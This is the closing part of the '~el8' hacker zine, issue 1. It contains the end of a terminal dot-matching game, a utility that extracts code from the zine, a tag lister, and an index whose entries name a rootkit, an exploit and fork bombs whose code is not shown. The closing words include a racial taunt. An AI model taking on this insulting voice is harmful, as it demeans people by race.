		puts("MAN WTF, I M4DE THIZ TR4CK3R FILE SHIT SO EZ"
		     "\nU'R L4YYYYYYYME!!!!!!!!!!!!!!!!!!!!!!!!!!!"
		     "\n");
		break;
		}	

		tmpint = 0;
		tmpstr = strtok(k33pntr4ck, ">");
		tmpstr = strtok(NULL, "");
		tmpint = atoi(tmpstr);

		fseek(kntFILE, 0, SEEK_SET);
		fprintf(kntFILE, "%s>%i\n", k33pntr4ck, tmpint + 1);
		fseek(kntFILE, 0, SEEK_SET);

	    } else {
		bzero(&k33pntr4ck, sizeof(k33pntr4ck));
		tmpint = 0;
		if (fgets(k33pntr4ck, sizeof(k33pntr4ck), kntFILE) == NULL)
		{
#ifdef DEBUG
		    puts("EOF ON tR4ck3R f1LE");
#endif
		fprintf(kntFILE,"ME>0\n");
		fprintf(kntFILE, "YOU>1\n");
		fseek(kntFILE, 0, SEEK_SET);
		continue;
		}

                tmpint = 0;

                for(index=0;index<=strlen(k33pntr4ck);index++)
                if(k33pntr4ck[index]=='>')
                {
                tmpint=1;
                break;
                }

                if(!(tmpint)) {
                puts("MAN WTF, I M4DE THIZ TR4CK3R FILE SHIT SO EZ"
                     "\nU'R L4YYYYYYME!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                     "\n");
                break;
                }

		tmpint2 = 0;
		tmpint2 = strlen(k33pntr4ck);
		bzero(&k33pntr4ck, sizeof(k33pntr4ck));

		if (fgets(k33pntr4ck, sizeof(k33pntr4ck), kntFILE) == NULL)
		{
#ifdef DEBUG
		    puts("EOF ON tR4ck3R f1LE");
#endif
		fprintf(kntFILE, "YOU>1\n");
		fseek(kntFILE, 0, SEEK_SET);
		continue;
		}

                tmpint = 0;

                for(index=0;index<=strlen(k33pntr4ck);index++)
                if(k33pntr4ck[index]=='>')
                {
                tmpint=1;
                break;
                }

                if(!(tmpint)) {
                puts("MAN WTF, I M4DE THIZ TR4CK3R FILE SHIT SO EZ"
                     "\nIM GL4D IM GN0T U!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                     "\n");
                break;
                }

		tmpstr = strtok(k33pntr4ck, ">");
		tmpstr = strtok(NULL, "");
		tmpint = atoi(tmpstr);

		fseek(kntFILE, tmpint2, SEEK_SET);
		fprintf(kntFILE, "%s>%i\n", k33pntr4ck, tmpint + 1);
		fseek(kntFILE, 0, SEEK_SET);
	    }
	}
    }

    printf("ST4TZ FOR THIS MATCH! MATCHED %i, NOTMATCHED %i, ROUNDZ[%i]\n",
	   st4tz.m4tched, st4tz.n0tm4tched, st4tz.round);

    st4tz.m4tched > st4tz.n0tm4tched ? puts("You win!!!") : puts("You loose@!@(N0T13ZIND0TD0T!)");

    if (!(t3rmio.c_lflag & ECHO))
	t3rmio.c_lflag |= ECHO;
#ifdef DIDNTHAVEICANON
    t3rmio.c_lflag |= ICANON;
#endif

    if ((tcsetattr(tfd, TCSANOW, &t3rmio)) < 0) {
	perror("tcsetattr(...)");
	exit(-1);
    }

    if (tfd)
	close(tfd);
    close(2);
    close(1);
    close(0);
    return 1;
}

void usage(void)
{
    puts("D0TD0T BY ()P3R4TI0N R4MPR4T");
    puts("Command line options--");
    puts("-r <maximum_rounds>");
    puts("--Command line options");
    puts("Howto-Play--");
    puts("On your first move you must place two points at random anywhere>");
    puts(".                      .");
    puts("On your second move you try and match two chars with the points>");
    puts("x                      y");
    puts("--Howto-Play");
    puts("Tracker-FILE--");
    puts("First line is your score: blah>0 '>' seperates the score.");
    puts("Second line is opponent score(y0rb4ds3lf):");
    puts("\tisuqsc0re>9999. '>' seperates the score.");
    puts("L()()K at the example c()nfig just b4 EOF :Q");
    puts("--Tracker-FILE");
    puts("<EOH>");
    puts("D0TD0T BY ()P3R4TI0N R4MPR4T");
    exit(1);
}

void sigc4tch(int signum)
{

    switch (signum) {
    case SIGINT:
	{
	    puts("C()uGHT: SiGiNT");
	    izattyfuqt();		
	    exit(1);
	}
    case SIGHUP:
	{
            puts("C()uGHT: SiGHuP");
            izattyfuqt();
	    exit(1);
	}
    case SIGQUIT:
	{
            puts("C()uGHT: SiGQUiT");
            izattyfuqt();
	    exit(1);
	}
    case SIGKILL:
	{
            puts("C()uGHT: SiGKiLL");
            izattyfuqt();
	    exit(1);
	}
    case SIGSEGV:

	{
            puts("C()uGHT: SiGSEgV");
            izattyfuqt();
	    exit(1);
        }
    case SIGPIPE:
	{
            puts("C()uGHT: SiGPiPE");
            izattyfuqt();
	    exit(1);
	}
    case SIGTERM:
	{
            puts("C()uGHT: SiGTeRM");
            izattyfuqt();
	    exit(1);
	}
    case SIGSTOP:
	{
            puts("C()uGHT: SiGSToP");
            izattyfuqt();
	    exit(1);
	}
    case SIGTSTP:
	{
            puts("C()uGHT: SiGTsTP");
            izattyfuqt();
	    exit(1);
	}
    default:
	{
	    puts("WEIERD!!!! sigc4tch()");
	    exit(-1);
	}
    }
    return;
}

void prnt_st4tz(void)
{
    printf("ST4TZ FOR THIS MATCH! MATCHED %i, NOTMATCHED %i, ROUNDZ[%i]\n",
	   st4tz.m4tched, st4tz.n0tm4tched, st4tz.round);

    st4tz.m4tched > st4tz.n0tm4tched ? puts("You win!!!") : puts("You loose@!@(N0T13ZIND0TD0T!)");
    return;
}

int izattyfuqt(void)
{
    struct termios t3rmio;

    bzero(&t3rmio, sizeof(struct termios));

    if (tcgetattr(st4tz.tfd, &t3rmio) < 0)
        perror("tcgetattr(...)");

            (void) prnt_st4tz();
            if (!(t3rmio.c_lflag & ECHO))
                t3rmio.c_lflag |= ECHO;
#ifdef DIDNTHAVEICANON
            t3rmio.c_lflag |= ICANON;
#endif
            if ((tcsetattr(st4tz.tfd, TCSANOW, &t3rmio)) < 0) {
                perror("tcsetattr(...)");
                exit(-1);
            }
return 1;
}

int wew4ntledz(void)
{
int ofd;
int ledst4te;

ledst4te = 0;

#if __linux__
	if((ofd = open("/dev/console", O_RDWR|O_NOCTTY))<0)
	{
		perror("open(...)");
		return -1;
	}

	switch(LEDLIGHT)
	{
		case NUM:
	{
		ledst4te = LED_NUM;
		break;
	}
		case SCROLL:
	{
		ledst4te = LED_SCR;
		break;
	}
		case CAPS:
	{
		ledst4te = LED_CAP;
		break;
	}
		case ALL:
	{
		ledst4te |= LED_NUM;
		ledst4te |= LED_SCR;
		ledst4te |= LED_CAP;
		break;
	}
	default:
		ledst4te = LED_NUM;
		break;
	}

	if(ioctl(ofd, KDSETLED, ledst4te)<0)
	{
		perror("ioctl(...)");
		return(-1);
	}

	sleep(1);

	if(ioctl(ofd, KDSETLED, 0)<0)
	{
		perror("ioctl(...)");
		return -1;
	}

	close(ofd);
#endif
return 1;
}

/*
EXAMPLE TRACKER FILE !!!!!!!!!!!!!

open tr4ck3R
------------
(LINE[1]) ME>0
(LINE[2]) MEBUTNOTME>0
-----eof----
open che4ttr4ck3r
------------
ESC'w'
ME>101312
J0HNK4RPETER>0
ESC':wq'
-----eof----
L00K IM BEATING J0HN K4RPETER 101312 TO 0!!!!!!!!
After every match, your score will be updated, after every NOTMATCH!@#@
	the second line score will be updated!!!!!!!!!!!!!!!!!
exit
------- LOGOUT --------

PS: trY cre4ting y()r 0wn st4tz f!le k0z th1ngz k1n g3t h3ct1c if th3 f1le
	iz g0t nUff1ngk in1t()!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
EOTF!
*/
[END_CUT] d0tdot.c
[END_DIR] PAGER+GAME

                                       +
------------------------------------------------------------------------------
                                       +
[(-01) eldump.c Article/Code Extraction by ~el8 staff]
                                       +
------------------------------------------------------------------------------
                                       +
[BEGIN_DIR] .
[CUT_HERE] eldump.c
/*
-+-+
cat <<'/*++--++*'> eldump.c # */

/**********************************************
 * released under (E) licensing ...           *
 *        (E) RULES AND REGULATIONS           *
 * permission to use/rewrite/add    : granted *
 * permission to trojan/steal       : denied  *
 * permission to use illegally      : denied  *
 * permission to use on dev/urandom : denied  *
 **********************************************/


/*******************************************
 * eldump.c for standard UNIX compilers    *
 * next version:                           *
 *                                         *
 *  +article extraction (ablility to       *(E)*
 *                specify article number)  *[~]*
 *  +code extract by article number        *[E]*
 *  +GUI interface for file viewing        *[L]*
 *             (most likely curses based)  *[8]*
 *  +ability to update code/articles via   *[`]*
 *               updates/correction posted *[9]*
 *               on ~el8 website           *[9]*
 *  +much cooler/faster/stronger/portable  *
 *  +Versions for DOS C/COBOL/Asm/Pascal   *
 *******************************************/

// Questions/Comments/Corrections @ el8@press.co.jp //
// el8.n3.net //


#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>

/**************************************
* next version of eldump will have    *
* a lot more features, this is just   *
* a basic code extraction version.    *
*      - team ~el8                    *
*                                     *
* #define ISH_START        "[SOI] %s" *
* #define ARTICLE_START    "[BOW] %s" *
* #define ARTICLE_END         "[EOW]" *
* #define ISH_END             "[EOI]" *
**************************************/

/* for verbosity */
#define VERBOSE                0x01
#define VERY	              0x10
#define LOTS	              0x20
/* char array sizes */
#define LINELEN                  80
#define BUFLEN                  255

/* Issue Tag Defines */
#define CODE_START  "[CUT_HERE] %s"
#define CODE_START_ARGS          1
#define DIR_START  "[BEGIN_DIR] %s"
#define DIR_START_ARGS           1
#define DIR_END      "[END_DIR] %s"
#define DIR_END_ARGS             1
#define CODE_END     "[END_CUT] %s"
#define CODE_END_ARGS            1
#define loop(n)            for(;n;)

/* global vars */
FILE *TextFD;
char BaseDirectory[BUFLEN], buf[LINELEN], CodeDir[BUFLEN + BUFLEN], tmp[LINELEN];
int verbose = 0, linez = 0, codez = 0, dirz = 0;
const char *license = \
"/***********************************************\n"
" * released under (E) licensing ...            *\n"
" *        (E) RULES AND REGULATIONS            *\n"
" * permission to use/rewrite/add     : granted *\n"
" * permission to trojan/steal        : denied  *\n"
" * permission to use illegally       : denied  *\n"
" * permission to use on /dev/urandom : denied  *\n"
" ***********************************************/\n"
"/* contact el8@press.co.jp for full license    */\n"
"/* code copyrighted by ~el8 -- don't infringe! */\n\n";

/**********************
* int  article(char *);
* int    issue(char *);
**********************/

/* function prototypes */
int code (char *);
int extr (char *);

int
main (int argc, char *argv[])
{
  int NumberOfFiles; // For multiple files
  getcwd (BaseDirectory, BUFLEN);	// error checking is for pussiez

  setvbuf (stderr, (char *) NULL, _IONBF, 0);  //unbuffer stderr (usually unbuffered anyhow)
  if (argc < 2) // no options specified
    {
      fprintf (stderr,
	       "\033[0;36m"
	       ".---------------------------------------.\n"
	       "|\033[1;36m  /\\/|    _  ___              _       \033[0;36m |\n"
	       "|\033[1;36m |/\\/ ___| |( _ )   _____  _| |_ _ __  \033[0;36m|\n"
               "|\033[1;36m     / _ \\ |/ _ \\  / _ \\ \\/ / __| '__| \033[0;36m|\n"
	       "|\033[1;36m    |  __/ | (_) ||  __/>  <| |_| |    \033[0;36m|\n"
               "|\033[1;36m     \\___|_|\\___/  \\___/_/\\_\\\\__|_|    \033[0;36m|\n"
	       "`---usage-------------------------------'\n"
	       "\033[m\n"
	       "\033[7m %s [file1 file2 file3 ...] <option>\t\033[m\n"
	       "\033[0;32m\n"
	       ".---options-----------------------------.\n"
	       "|+\033[1;32m   [-v]: verbose     \033[0;32m                 |\n"
	       "|+\033[1;32m  [-vv]: very verbose\033[0;32m                 |\n"
	       "|+\033[1;32m [-vvv]: very very verbose \033[0;32m           |\n"
	       "`---------------------------------------'\n"
	       "\033[m",
	       argv[0]);
      exit (-1);
    }

  verbose -= verbose; // zero verbose
  if (!strncmp (argv[argc - 1], "-v", 2)) // if the last option was a "-v"
    {
      verbose = VERBOSE;
      argc--;
    }
  else if (!strncmp (argv[argc - 1], "-vv", 3)) // "-vv"
    {
      verbose = (VERY + VERBOSE);
      argc--;
    }
  else if (!strncmp (argv[argc - 1], "-vvv", 4)) // "-vvv"
    {
      verbose = (LOTS + VERBOSE + LOTS);
      argc--;
    }

  if (argc < 2)
    {
      fprintf (stderr, "need files...\n");
      exit (-1);
    }

  for (NumberOfFiles = 1; NumberOfFiles < argc; NumberOfFiles++)
    {
      if (verbose >= LOTS)
	{
	  fprintf (stderr, "eldumping code from %s\n", argv[NumberOfFiles]);
	  if (extr (argv[NumberOfFiles]) == 0)
	    {
	      fprintf (stderr, "[#%i] code eldump of %s: success!\n",
		       NumberOfFiles, argv[NumberOfFiles]);
	    }
	  else
	    {
	      fprintf (stderr, "[#%i] code eldump of %s: failed.\n",
		       NumberOfFiles, argv[NumberOfFiles]);
	    }
	}
      else
	{
	  extr (argv[NumberOfFiles]);
	}
    }

  if (verbose >= VERBOSE)
    {
      fprintf (stderr, "\t%i texts\n\t%i dirs\n\t%i codes\n\t\%i lines\n",
	       NumberOfFiles - 1, dirz, codez, linez);
    }
  exit (0);
}

int
extr (char *TextFileName)

{
  char arg[LINELEN];
  if ((TextFD = fopen (TextFileName, "r")) == NULL)
    {
      fprintf (stderr, "opening text %s: %s\n", TextFileName, strerror (errno));
      return (-1);
    }
  loop (!feof (TextFD))
  {
    fgets (buf, LINELEN, TextFD);

    if (sscanf (buf, DIR_START, arg) == DIR_START_ARGS)
      {
	snprintf (CodeDir, sizeof CodeDir, "%s/%s", BaseDirectory, arg);
	if (verbose >= VERBOSE)
	  {
	    fprintf (stderr, "creating %s/\n", CodeDir);
	    dirz++;
	  }

	if ((mkdir (CodeDir, 0700) == -1) && (errno != EEXIST))
	  {
	    perror (CodeDir);
	    fclose (TextFD);
	    return (-1);
	  }
	if (chdir (CodeDir) == -1)
	  {
	    fprintf (stderr, "changing to code dir %s: %s\n", CodeDir, strerror (errno));
	    fclose (TextFD);
	    return (-1);
	  }
	else if (verbose >= LOTS)
	  fprintf (stderr, "changing to %s\n", CodeDir);
      }
    else if (sscanf (buf, CODE_START, arg) == CODE_START_ARGS)
      {
	if (verbose >= VERY)
	  fprintf (stderr, "eldumping %s\n", arg);
	if (code (arg) == -1)
	  {
	    fclose (TextFD);
	    return (-1);
	  }
      }

    else if (sscanf (buf, DIR_END, tmp) == DIR_END_ARGS)
      {
	if (verbose >= LOTS)
	  fprintf (stderr, "changing to ..\n");

	chdir ((!strcmp (arg, ".")) ? "." : "..");
      }
  }
  fclose (TextFD);
  return (0);
}

int
code (char *CodeFileName)
{
  FILE *CodeFile;
  char codebuff[BUFLEN];

  chdir ((CodeDir != NULL) ? CodeDir : ".");

  if ((CodeFile = fopen (CodeFileName, "w+")) == NULL)
    {
      fprintf (stderr, "opening code %s: %s\n", CodeFileName, strerror (errno));
      return (-1);
    }
  if (verbose >= VERBOSE)
    codez++;
  if (CodeFileName[strlen(CodeFileName)-1] == 'c' && CodeFileName[strlen(CodeFileName)-2] == '.')
  fputs (license, CodeFile);
  loop (!feof (TextFD))
  {
    fgets (codebuff, LINELEN, TextFD);

    if (sscanf (codebuff, CODE_END, tmp) == CODE_END_ARGS)
      {
	if (verbose >= LOTS)
	  fprintf (stderr, "end of %s\n", CodeFileName);

	fclose (CodeFile);
	break;
      }
    else
      {
	fputs (codebuff, CodeFile);
	if (verbose >= VERBOSE)
	  linez++;

      }
  }
  return 0;
}

// [CUT_HERE] <NAME> then [END_CUT] <NAME>  //
// [BEGIN_DIR] <NAME> then [END_DIR] <NAME> //


/*++--++*
   cat <<'[EOI]'> /dev/null
*/

[END_CUT] eldump.c

*!* BONUS *!*
here is a tag dumper for ~el8. some of this code will be used for the next
eldump. (expect a LOT more)

[CUT_HERE] eltag.c
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#define loop(n)     for(;n;)

char *TAG="[(%i) %s]";
char *TOCTAG="~el8|*iSSue1*[(%u) %s]*iSSue1|~el8";

extern char *optarg;
FILE *out;
void t4gz(char *,char*,int);

int
main (int argc, char *argv[])
{
  int p;
  char *file;
  int type;
  char *t4g = TAG;
  if (argc < 3)
    {
      fprintf (stderr, "usage: %s <format> <-t> [-f infile] <-o outfile>\n"
                       "formats:\n"
                       "\t[-i]: integer output\n"
                       "\t[-X]: uppercase hexidecimal output\n"
                       "\t[-O]: octal output\n"
                       "\t[-x]: lowercase hexadecimal\n"
                       "[-t] = output table of contents\n",argv[0]);
      exit (-1);
    }
  while ( (p = getopt(argc,argv,"tiXOxf:o:"))!=EOF){
      switch(p){
         case 't':
            t4g = TOCTAG;
            break;
         case 'i':
            type = p;
            break;
         case 'X':
            type = p;
            break;
         case 'O':
            type = p;
            break;
         case 'x':
            type = p;
            break;
         case 'f':
            file = optarg;
            break;
         case 'o':
            if ((out=fopen(optarg,"w+"))==NULL)
                {
                  perror(optarg);
                  exit (-1);
                }
            break;
         default:
            exit(-1);
      }
  }
  if (out==NULL) out=stderr;
  t4gz(file,t4g, type);
  exit (0);
}

void
t4gz (char *T,char *tag,int io)

{
  char articlename[80];
  unsigned articleno=0;
  int lineno;
  FILE *TFD;
  char buf[80];

  if ((TFD = fopen (T, "r")) == NULL)
    {
      perror(T);
      exit (-1);
    }
  bzero((char*)&buf,sizeof(buf));
  lineno-=lineno;
  loop (!feof (TFD))
  {
    lineno++;
    fgets (buf, sizeof(buf), TFD);

    if (sscanf(buf,tag,&articleno,articlename) == 2)
      {
        if (buf[strlen(buf)-1] == '\n') buf[strlen(buf)-1] = '\0';
        switch (io) {
          case 'i':
            fprintf(stderr,"[(%04i) %20s]\t @ \033[1mLine %i\033[m\n",articleno,articlename,lineno);
            break;
          case 'X':
            fprintf(stderr,"[(%4X) %20s]\t @ \033[1mLine %i\033[m\n",articleno,articlename,lineno);
            break;
          case 'O':
            fprintf(stderr,"[(%4o) %20s]\t @ \033[1mLine %i\033[m\n",articleno,articlename,lineno);
            break;
          case 'x':
            fprintf(stderr,"[(%4x) %20s]\t @ \033[1mLine %i\033[m\n",articleno,articlename,lineno);
            break;
          default:
            fprintf(stderr,"[(%04i) %20s]\t @ \033[1mLine #%i\033[m\n",articleno,articlename,lineno);
            break;
        }
      }
    bzero((char*)&buf,sizeof(buf));
  }
  fclose (out);
  fclose (TFD);
  exit (0);
}
[END_CUT] eltag.c
[EOW]

                                       +
------------------------------------------------------------------------------
                                       +
[(-02) Closing Words by nEWn4n]
                                       +
------------------------------------------------------------------------------
                                       +

        The code you ask for, THE CODE YOU GET. The warez you want, THE WAREZ
	YOU GET! ~el8, you all wanted it, NOW YOU GOT IT!!!!! ISSUE 1 IS NOW
	OVER.

	BTW: ASIAN PEOPLE OWN YOU WHITEYS.


[CUT_HERE] INDEX  
INDEX |
------'
[(0x00) Closing Wrods by nEWn4n]
[(0x00) INDEX]
[(0x0) Introduction to ~el8
[(0x1) ph1x4ti0Nz bUcKt00tH raz0Rc4T r00tk1t
+	Rootkit.sh
[(0x2) px25 Network Primer
+	penis.h
+	pen15_client.c
+	pen15_serv.c
+	viagra.c
[(0x3) zgv exploit
+	zgvexploit.c
+	heh.jpg.uu
[(0x4) AlphaSort
+	asort.c
[(0x5) Sp1ffy
+	lightbright_even.c
+	lightbright_rand.c
+	typetext.c
[(0x6) x0rENC
+	x0r.c
[(0x7) UDP vs. TCP
+	uvt.c
+	uvtd.c
[(0x8) Obfuse Codez
+	ob1.c
+	obfuse.c
[(0x9) IRC Ettiquette
+	school.HOWTO
+	fakewhois.c
[(0xA) ~EL8 ADVISORY
+	el0-advisory.txt
[(0xB) Anarchist Code Kit
+	f0rkb0mb.c
+	mkdirb0mb.c
+	sig_fork.c
[(0xC) u4ea-dr0p
+	u4ea-dr0p.c
+	bronc-lkm.c
+	bronc-diary.txt
[(0xD) matrix.c
+	matrix.c
[(0xE) SendRaw
+	w00w00-RawIP.c
[(0xF) PAGER+GAME
+	pager.c
+	killdaemon.c
+	d0tdot.c
[(0x0) ELDUMP
+	eldump.c
+	eltag.c
[(0x0) Closing Words
[(0x0) INDEX
[END_CUT] INDEX
[END_DIR] .
[EOW]
[EOI]
echo '
                                           lllllll      888888888
                                           l:::::l    88:::::::::88
                                           l:::::l  88:::::::::::::88
                                           l:::::l 8::::::88888::::::8
                            eeeeeeeeeeee    l::::l 8:::::8     8:::::8
                          ee::::::::::::ee  l::::l 8:::::8     8:::::8
    _________     _____ e::::::eeeee:::::ee l::::l  8:::::88888:::::8
   /          \  /     |e::::::e     e:::::el::::l   8:::::::::::::8
  /  ~el8      \/      /e:::::::eeeee::::::el::::l  8:::::88888:::::8
 /       _            / e:::::::::::::::::e l::::l 8:::::8     8:::::8
/      /  \          /  e::::::eeeeeeeeeee  l::::l 8:::::8     8:::::8
\_____/    \________/   e:::::::e           l::::l 8:::::8     8:::::8
                        e::::::::e         l::::::l8::::::88888::::::8
                         e::::::::eeeeeeee l::::::l 88:::::::::::::88
                          ee:::::::::::::e l::::::l   88:::::::::88
                            eeeeeeeeeeeeee llllllll     888888888
                                                       .codelogic.
'
echo 'Extracted eldump.c'
echo 'use $CC eldump.c -o eldump'
echo './eldump ~el8[0] (-v | -vv | -vvv)'
echo
echo '   _* ~el8 team 294 local 24 *_'
echo '    *  check local listings  *'
